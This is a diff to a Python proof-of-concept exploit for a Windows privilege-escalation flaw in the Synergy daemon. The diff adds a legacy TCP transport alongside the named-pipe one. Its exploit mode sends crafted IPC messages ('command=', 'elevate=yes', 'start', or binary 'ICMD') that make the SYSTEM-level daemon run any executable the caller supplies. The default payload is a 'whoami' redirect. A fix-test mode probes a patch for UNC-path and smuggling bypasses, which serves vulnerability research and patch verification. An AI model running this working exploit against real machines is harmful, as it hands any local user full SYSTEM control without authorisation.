@@ -1,54 +1,69 @@
 #!/usr/bin/env python3
 """
-CVE-2026-41477 (Synergy variant) — Synergy daemon IPC privilege escalation.
+Synergy daemon IPC privilege escalation — covers two daemon eras.
 
-Synergy is built from the same Deskflow upstream that the original CVE was
-filed against. The vulnerable daemon code (`src/lib/deskflow/win32/DaemonIpcServer.cpp`,
-`DaemonApp.cpp`) ships verbatim in Synergy with only the pipe name changed
-(`synergy-daemon` instead of `deskflow-daemon`, via DESKFLOW_APP_ID).
+The Windows Synergy daemon runs as SYSTEM. Two distinct IPC implementations
+have been used to receive commands from the (unprivileged) GUI; both, before
+their respective fixes, accept attacker-controlled executables and spawn them
+as SYSTEM.
 
-The Synergy daemon on Windows runs as SYSTEM and exposes a world-accessible
-Qt named pipe (`synergy-daemon`). Pre-fix it accepts:
+(1) TCP IPC — older Synergy, before the upstream Qt named-pipe daemon IPC
+    was backported (commit 66acba5cad "Backport new upstream daemon IPC").
+    The daemon listens on 127.0.0.1:24801 with a custom binary protocol
+    defined in `src/lib/common/ipc.h`. Wire format: 4-byte ASCII tag +
+    payload. Hello (gui->daemon): 'IHEL' + UInt8 clientType (GUI=1).
+    Hello back (daemon->gui): 'IHEL' (no payload). Command (gui->daemon):
+    'ICMD' + UInt32-BE length + command bytes + UInt8 elevate flag. The
+    daemon spawns the command on receipt — there is no separate `start`
+    message.
 
-    command=<arbitrary exe + args>
-    elevate=yes
-    start
+(2) Qt named-pipe IPC — current Synergy, post-backport. The daemon exposes
+    a world-accessible named pipe `synergy-daemon` (DESKFLOW_APP_ID +
+    "-daemon"). Wire protocol: newline-delimited UTF-8 `key=value` lines.
+    Pre-fix it accepts:
+        command=<arbitrary exe + args>
+        elevate=yes
+        start
+    Post-fix (CVE-2026-41477, deskflow PR 9656; backport in progress for
+    Synergy) the `command=` and `elevate=` handlers are gone and the GUI
+    instead points the daemon at a config file from which it derives a
+    trusted core binary path. This PoC's `fix-test` mode probes for the
+    fix shape; it only applies to the named-pipe IPC.
 
-…causing the daemon to spawn the attacker-supplied executable as SYSTEM.
-Any local user could escalate to SYSTEM.
-
-Status as of master: Synergy has NOT backported the Deskflow fix
-(commits 44affec5e2 / c338b5797d / 5d7c1e30d6). The `command=` / `elevate=`
-handlers are still live and there is no `configFile=` replacement.
-
-This script has two modes:
+Modes:
 
     --mode exploit
-        Reproduces the vulnerability. Run against a current Synergy daemon
-        — you should see the payload execute as SYSTEM.
+        Reproduces the privesc end-to-end. Drops a `whoami` redirect via
+        cmd.exe and verifies the resulting file appears at the expected
+        path (created by SYSTEM, owned by the daemon process tree).
 
     --mode fix-test
-        Probes for a backported fix: confirms `command=` is gone (case A),
-        UNC paths in `configFile=` are rejected before `QFileInfo::exists()`
-        can trigger SMB auth from the SYSTEM-context daemon (case B), and
-        that shell-style command smuggling via `configFile=` has no effect
-        (case C). Useful if/when Synergy picks up the upstream fix.
+        Named-pipe only. Probes for the deskflow PR 9656 fix shape:
+        legacy `command=` rejected, `configFile=` UNC paths rejected
+        before existence check, no shell-style smuggling via `configFile=`.
 
     --mode auto (default)
-        Probes the daemon once and picks: pre-fix → exploit, post-fix → fix-test.
+        Pipe transport: pre-fix -> exploit, post-fix -> fix-test.
+        TCP transport: always exploit (no fix concept on the legacy IPC).
 
-Unlike the Deskflow version, Synergy's `hello` handler does NOT echo a
-version string back; it just replies "hello\\n". So there is no version
-discovery / handshake — we just send "hello" and expect "hello" back.
+Transports:
+
+    --transport pipe  -> Qt named-pipe IPC only (newer daemon)
+    --transport tcp   -> legacy TCP IPC only (older daemon)
+    --transport auto  -> probes both; uses whichever the daemon exposes.
 """
 
 import argparse
 import os
 import socket
+import struct
 import sys
 import time
 
 PIPE_NAME = "synergy-daemon"
+TCP_HOST = "127.0.0.1"
+TCP_PORT = 24801
+TCP_CLIENT_TYPE_GUI = 1  # IpcClientType::GUI from src/lib/common/ipc.h
 
 if os.name == "nt":
     import ctypes
@@ -115,22 +130,6 @@ def _wait_for_file(path, timeout=6.0, interval=0.2):
     return False
 
 
-def _detect_branch():
-    """Return 'post-fix' if `configFile=` is wired up, 'pre-fix' otherwise.
-
-    Probe: send an empty `configFile=`. On a fix branch this hits the
-    empty-path check and replies 'error'. On pre-fix Synergy there is no
-    handler — the daemon logs 'unknown message' and sends no reply.
-    """
-    try:
-        with connect_and_handshake() as c:
-            c.send("configFile=")
-            reply = c.recv_line(timeout=1.0)
-    except Exception:  # noqa: BLE001
-        return None
-    return "post-fix" if "error" in (reply or "").lower() else "pre-fix"
-
-
 _REJECT_WORDS = ("unknown command", "unknown message", "does not exist", "invalid", "error")
 
 
@@ -188,19 +187,11 @@ def _post_case_log(log_path, pre_size, expect_reject=True, flush_delay=0.25, na=
         _verdict(not rejected, "no rejection keywords — accepted as expected." if not rejected else "unexpected rejection keywords.")
 
 
-def _query_log_path():
-    try:
-        with connect_and_handshake() as c:
-            c.send("logPath")
-            reply = c.recv_line(timeout=1.0)
-    except Exception:  # noqa: BLE001
-        return None
-    if reply.startswith("logPath="):
-        return reply.split("=", 1)[1].strip() or None
-    return None
+# ===========================================================================
+# Pipe transport (newer Synergy: Qt named-pipe IPC, newline `key=value`)
+# ===========================================================================
 
-
-class IpcClient:
+class PipeIpcClient:
     """Line-oriented client for Qt's QLocalServer.
 
     On Windows the server is a named pipe; on Linux/macOS it's AF_UNIX. The
@@ -283,13 +274,13 @@ class IpcClient:
         self.close()
 
 
-def connect_and_handshake():
-    """Open a fresh IPC connection and complete the trivial hello handshake.
+def pipe_connect_and_handshake():
+    """Open a fresh pipe IPC connection and complete the trivial hello handshake.
 
     Synergy's daemon replies "hello\\n" to any "hello..." message — there is
     no version negotiation, unlike the upstream Deskflow fix branch.
     """
-    c = IpcClient()
+    c = PipeIpcClient()
     c.send("hello")
     reply = c.recv_line(timeout=2.0)
     if "hello" not in (reply or "").lower():
@@ -298,7 +289,7 @@ def connect_and_handshake():
     return c
 
 
-def send_and_print(client, message, label, read_timeout=0.75):
+def pipe_send_and_print(client, message, label, read_timeout=0.75):
     print(f"    >> {label}: {message!r}")
     client.send(message)
     reply = client.recv_line(timeout=read_timeout)
@@ -306,20 +297,166 @@ def send_and_print(client, message, label, read_timeout=0.75):
     return reply
 
 
-# ---------------------------------------------------------------------------
-# Mode: exploit — run against current Synergy / pre-fix daemon
-# ---------------------------------------------------------------------------
+def pipe_detect_branch():
+    """Return 'post-fix' if `configFile=` is wired up, 'pre-fix' otherwise.
 
-def mode_exploit(payload_exe, evidence_path):
-    """Reproduce the pre-fix vulnerability end-to-end."""
+    Probe: send an empty `configFile=`. On a fix branch this hits the
+    empty-path check and replies 'error'. On pre-fix Synergy there is no
+    handler — the daemon logs 'unknown message' and sends no reply.
+    """
+    try:
+        with pipe_connect_and_handshake() as c:
+            c.send("configFile=")
+            reply = c.recv_line(timeout=1.0)
+    except Exception:  # noqa: BLE001
+        return None
+    return "post-fix" if "error" in (reply or "").lower() else "pre-fix"
+
+
+def pipe_query_log_path():
+    try:
+        with pipe_connect_and_handshake() as c:
+            c.send("logPath")
+            reply = c.recv_line(timeout=1.0)
+    except Exception:  # noqa: BLE001
+        return None
+    if reply.startswith("logPath="):
+        return reply.split("=", 1)[1].strip() or None
+    return None
+
+
+# ===========================================================================
+# TCP transport (older Synergy: pre-named-pipe-backport, custom binary IPC)
+# ===========================================================================
+#
+# Wire format (from src/lib/common/ipc.h and src/lib/ipc/IpcClientProxy.cpp):
+#
+#   gui  -> daemon  IHEL  + UInt8 clientType         (kIpcMsgHello)
+#   daemon -> gui   IHEL                             (kIpcMsgHelloBack, no payload)
+#   gui  -> daemon  ICMD  + %s + UInt8 elevate       (kIpcMsgCommand)
+#
+# %s here is ProtocolUtil's length-prefixed string: UInt32 big-endian length
+# followed by raw bytes. The daemon spawns the command on receipt of ICMD —
+# there is no separate `start` like in the newer IPC. There is also no `stop`
+# or `clear` from the GUI side; the only attacker-relevant message is ICMD.
+
+class TcpIpcClient:
+    def __init__(self, timeout=3.0):
+        self._timeout = timeout
+        self._sock = socket.create_connection((TCP_HOST, TCP_PORT), timeout=timeout)
+        self._sock.settimeout(timeout)
+
+    def _recv_exact(self, n, timeout=None):
+        """Read exactly n bytes or raise TimeoutError."""
+        self._sock.settimeout(timeout if timeout is not None else self._timeout)
+        buf = bytearray()
+        while len(buf) < n:
+            chunk = self._sock.recv(n - len(buf))
+            if not chunk:
+                raise ConnectionError("daemon closed connection during read")
+            buf.extend(chunk)
+        return bytes(buf)
+
+    def send_hello(self):
+        # IHEL + UInt8 clientType. We claim to be GUI (1).
+        self._sock.sendall(b"IHEL" + bytes([TCP_CLIENT_TYPE_GUI]))
+
+    def expect_hello_back(self, timeout=2.0):
+        # Daemon writes 'IHEL' (no payload) via kIpcMsgHelloBack.
+        tag = self._recv_exact(4, timeout=timeout)
+        if tag != b"IHEL":
+            raise RuntimeError(f"unexpected hello-back tag: {tag!r}")
+
+    def send_command(self, command, elevate):
+        # ICMD + UInt32-BE-len + bytes + UInt8 elevate flag.
+        cmd_bytes = command.encode("utf-8")
+        msg = b"ICMD" + struct.pack(">I", len(cmd_bytes)) + cmd_bytes + bytes([1 if elevate else 0])
+        self._sock.sendall(msg)
+
+    def close(self):
+        try:
+            self._sock.close()
+        except OSError:
+            pass
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *exc):
+        self.close()
+
+
+def tcp_connect_and_handshake():
+    """Open a TCP connection and complete IHEL handshake."""
+    c = TcpIpcClient()
+    c.send_hello()
+    c.expect_hello_back()
+    return c
+
+
+# ===========================================================================
+# Transport probing & selection
+# ===========================================================================
+
+def probe_pipe(timeout=1.0):
+    """Return True if the named pipe is connectable and answers `hello`."""
+    try:
+        c = PipeIpcClient(timeout=timeout)
+    except OSError:
+        return False
+    try:
+        c.send("hello")
+        return "hello" in (c.recv_line(timeout=timeout) or "").lower()
+    except Exception:  # noqa: BLE001
+        return False
+    finally:
+        c.close()
+
+
+def probe_tcp(timeout=1.0):
+    """Return True if 127.0.0.1:24801 is connectable and completes IHEL handshake."""
+    try:
+        c = TcpIpcClient(timeout=timeout)
+    except OSError:
+        return False
+    try:
+        c.send_hello()
+        c.expect_hello_back(timeout=timeout)
+        return True
+    except Exception:  # noqa: BLE001
+        return False
+    finally:
+        c.close()
+
+
+def detect_transport():
+    """Probe both transports; return 'pipe', 'tcp', or None.
+
+    Pipe is probed first because it's the active path on current daemons.
+    A daemon serving both is theoretically possible but unseen in practice;
+    pipe wins the tiebreak (fix-test mode is more useful than exploit-only).
+    """
+    if probe_pipe():
+        return "pipe"
+    if probe_tcp():
+        return "tcp"
+    return None
+
+
+# ===========================================================================
+# Mode: exploit (pipe transport)
+# ===========================================================================
+
+def mode_exploit_pipe(payload_exe, evidence_path):
+    """Reproduce the pre-fix vulnerability end-to-end via the named-pipe IPC."""
     print("=" * 70)
-    print("MODE: exploit  —  targets the pre-fix (vulnerable) Synergy daemon")
+    print("MODE: exploit (pipe)  —  targets the pre-fix Synergy daemon (Qt IPC)")
     print("=" * 70)
     print(f"Payload: {payload_exe}")
     print("Expected on pre-fix:  FAIL — daemon spawns payload as SYSTEM.")
     print("Expected on post-fix: PASS — legacy `command=` is unknown, nothing spawned.\n")
 
-    log_path = _query_log_path()
+    log_path = pipe_query_log_path()
     if log_path:
         print(f"[*] Daemon log: {log_path}")
 
@@ -330,10 +467,10 @@ def mode_exploit(payload_exe, evidence_path):
             pass
 
     pre = _log_size(log_path)
-    with connect_and_handshake() as c:
-        send_and_print(c, f"command={payload_exe}", "inject command")
-        send_and_print(c, "elevate=yes", "request elevation")
-        send_and_print(c, "start", "start watchdog")
+    with pipe_connect_and_handshake() as c:
+        pipe_send_and_print(c, f"command={payload_exe}", "inject command")
+        pipe_send_and_print(c, "elevate=yes", "request elevation")
+        pipe_send_and_print(c, "start", "start watchdog")
 
     if evidence_path is None:
         _print_tail(_log_tail(log_path, pre))
@@ -356,24 +493,74 @@ def mode_exploit(payload_exe, evidence_path):
             os.remove(evidence_path)
         except OSError:
             pass
-    elif _detect_branch() == "pre-fix":
+    elif pipe_detect_branch() == "pre-fix":
         _verdict(None, "no evidence file within 15s but daemon is pre-fix — likely in watchdog backoff. Re-run.")
     else:
         _verdict(True, "no evidence file — legacy `command=` was rejected.")
 
 
-# ---------------------------------------------------------------------------
-# Mode: fix-test — run against fix branch (if/when Synergy backports it)
-# ---------------------------------------------------------------------------
+# ===========================================================================
+# Mode: exploit (tcp transport)
+# ===========================================================================
+
+def mode_exploit_tcp(payload_exe, evidence_path):
+    """Reproduce the pre-named-pipe-backport vulnerability via the legacy TCP IPC."""
+    print("=" * 70)
+    print("MODE: exploit (tcp)  —  targets pre-backport Synergy daemon (legacy IPC)")
+    print("=" * 70)
+    print(f"Payload: {payload_exe}")
+    print("Expected: FAIL — daemon spawns payload as SYSTEM on receipt of ICMD.")
+    print("(There is no fix-test for this transport; the fix is the named-pipe rewrite itself.)\n")
+
+    if evidence_path:
+        try:
+            os.remove(evidence_path)
+        except OSError:
+            pass
+
+    print("[*] TCP target: %s:%d" % (TCP_HOST, TCP_PORT))
+    with tcp_connect_and_handshake() as c:
+        print(f"    >> ICMD command={payload_exe!r} elevate=1")
+        c.send_command(payload_exe, elevate=True)
+        # The legacy daemon spawns immediately; there's no ack on this channel.
+        # Give the watchdog a moment to actually create the process.
+        time.sleep(0.5)
+
+    if evidence_path is None:
+        _verdict(None, "custom --payload-exe supplied; cannot auto-verify. Inspect log/system state.")
+        return
+
+    _wait_for_file(evidence_path, timeout=15.0)
+
+    if os.path.exists(evidence_path):
+        _verdict(False, f"privesc confirmed — evidence file created by daemon: {evidence_path}")
+        try:
+            with open(evidence_path, encoding="utf-8", errors="replace") as f:
+                for line in f.read().splitlines()[:12]:
+                    print(f"         | {line}")
+        except OSError as e:
+            print(f"         !! read failed: {e}")
+        try:
+            os.remove(evidence_path)
+        except OSError:
+            pass
+    else:
+        # Legacy daemon may also have a watchdog backoff window; absence isn't proof of fix.
+        _verdict(None, "no evidence file within 15s — daemon may be in backoff or the command path failed silently. Re-run.")
+
+
+# ===========================================================================
+# Mode: fix-test (pipe only)
+# ===========================================================================
 
 def _fix_case(title, messages, expectation):
     print(f"\n  [case] {title}")
     print(f"         expected: {expectation}")
     replies = []
     try:
-        with connect_and_handshake() as c:
+        with pipe_connect_and_handshake() as c:
             for label, msg in messages:
-                replies.append(send_and_print(c, msg, label))
+                replies.append(pipe_send_and_print(c, msg, label))
     except Exception as e:  # noqa: BLE001
         print(f"         !! aborted: {e}")
         return None
@@ -381,19 +568,19 @@ def _fix_case(title, messages, expectation):
 
 
 def mode_fix_test():
-    """Injection battery against the new configFile= IPC command."""
+    """Injection battery against the new configFile= IPC command (pipe transport)."""
     print("=" * 70)
     print("MODE: fix-test  —  probes the new configFile= command for bypasses")
     print("=" * 70)
     print("Each case should be rejected or have no privileged effect.\n")
 
-    log_path = _query_log_path()
+    log_path = pipe_query_log_path()
     if log_path:
         print(f"[*] Daemon log: {log_path}")
     else:
         print("[!] Could not query daemon logPath; per-case checks will show [CHECK LOG].")
 
-    branch = _detect_branch()
+    branch = pipe_detect_branch()
     pre_fix = branch == "pre-fix"
     if pre_fix:
         print("[!] Pre-fix daemon detected — `configFile=` is not wired up here.")
@@ -512,7 +699,7 @@ def mode_fix_test():
         _verdict(True, "no evidence file — path not shell-interpreted, smuggle blocked.")
 
 
-# ---------------------------------------------------------------------------
+# ===========================================================================
 
 def main():
     ap = argparse.ArgumentParser(
@@ -520,37 +707,67 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     ap.add_argument("--mode", choices=("auto", "exploit", "fix-test"), default="auto")
+    ap.add_argument("--transport", choices=("auto", "pipe", "tcp"), default="auto",
+                    help="Which IPC transport to target. 'pipe' = newer Qt named-pipe IPC, "
+                         "'tcp' = legacy 127.0.0.1:24801 IPC, 'auto' = probe both.")
     ap.add_argument(
         "--payload-exe",
         default=None,
-        help="Command used in --mode=exploit for the legacy `command=` message. "
-             "Defaults to a `whoami` redirect whose output path is auto-verified.",
+        help="Command used in --mode=exploit. Defaults to a `whoami` redirect "
+             "whose output path is auto-verified.",
     )
     args = ap.parse_args()
     _enable_vt()
 
-    print(f"[*] Target pipe: {PIPE_NAME}")
+    transport = args.transport
+    if transport == "auto":
+        transport = detect_transport()
+        if transport is None:
+            print(f"[!] No daemon detected on pipe '{PIPE_NAME}' or tcp {TCP_HOST}:{TCP_PORT}.")
+            print("    Is the Synergy daemon running?")
+            return 2
+        print(f"[*] Auto-detected transport: {transport}")
 
-    # Probe the daemon: a fresh handshake confirms it's listening and reachable.
-    try:
-        with connect_and_handshake():
-            pass
-    except Exception as e:  # noqa: BLE001
-        print(f"[!] Could not handshake with daemon ({e}) — is it running?")
-        return 2
-    print("[*] Handshake OK\n")
+    if transport == "pipe":
+        print(f"[*] Target pipe: {PIPE_NAME}")
+        # Probe handshake to confirm reachability and surface error early.
+        try:
+            with pipe_connect_and_handshake():
+                pass
+        except Exception as e:  # noqa: BLE001
+            print(f"[!] Could not handshake with daemon ({e}) — is it running?")
+            return 2
+        print("[*] Pipe handshake OK\n")
+    else:  # tcp
+        print(f"[*] Target tcp: {TCP_HOST}:{TCP_PORT}")
+        try:
+            with tcp_connect_and_handshake():
+                pass
+        except Exception as e:  # noqa: BLE001
+            print(f"[!] Could not handshake with daemon ({e}) — is it running?")
+            return 2
+        print("[*] TCP handshake OK\n")
 
     mode = args.mode
     if mode == "auto":
-        branch = _detect_branch()
-        if branch == "pre-fix":
+        if transport == "tcp":
+            # The legacy IPC has no fix concept; only exploit makes sense.
             mode = "exploit"
-        elif branch == "post-fix":
-            mode = "fix-test"
+            print("[*] TCP transport: defaulting to --mode exploit (no fix-test on legacy IPC)\n")
         else:
-            print("[!] Could not detect daemon branch — pass --mode exploit or --mode fix-test explicitly.")
-            return 2
-        print(f"[*] Auto-detected daemon branch: {branch} — running --mode {mode}\n")
+            branch = pipe_detect_branch()
+            if branch == "pre-fix":
+                mode = "exploit"
+            elif branch == "post-fix":
+                mode = "fix-test"
+            else:
+                print("[!] Could not detect daemon branch — pass --mode exploit or --mode fix-test explicitly.")
+                return 2
+            print(f"[*] Auto-detected daemon branch: {branch} — running --mode {mode}\n")
+
+    if mode == "fix-test" and transport == "tcp":
+        print("[!] --mode fix-test only applies to the pipe transport. The legacy IPC has no fix to test.")
+        return 2
 
     if mode == "exploit":
         if args.payload_exe:
@@ -558,18 +775,22 @@ def main():
         else:
             evidence_path = rf"C:\Windows\Temp\synergy_privesc_{os.getpid()}.txt"
             payload_exe = rf'C:\Windows\System32\cmd.exe /c whoami > "{evidence_path}"'
-        mode_exploit(payload_exe, evidence_path)
+        if transport == "pipe":
+            mode_exploit_pipe(payload_exe, evidence_path)
+        else:
+            mode_exploit_tcp(payload_exe, evidence_path)
     elif mode == "fix-test":
         mode_fix_test()
 
-    # Signing off — leaves a harmless "unknown message: meow" warning in the
-    # daemon log as a calling card (handled by DaemonIpcServer::processMessage's
-    # default branch).
-    try:
-        with connect_and_handshake() as c:
-            c.send("meow")
-    except Exception:  # noqa: BLE001
-        pass
+    # Signing off — leaves a harmless calling card on the pipe transport.
+    # The TCP transport rejects unknown 4-byte tags by closing the connection,
+    # which is noisier in the log than we want for a benign signoff, so skip.
+    if transport == "pipe":
+        try:
+            with pipe_connect_and_handshake() as c:
+                c.send("meow")
+        except Exception:  # noqa: BLE001
+            pass
 
     return 0
 
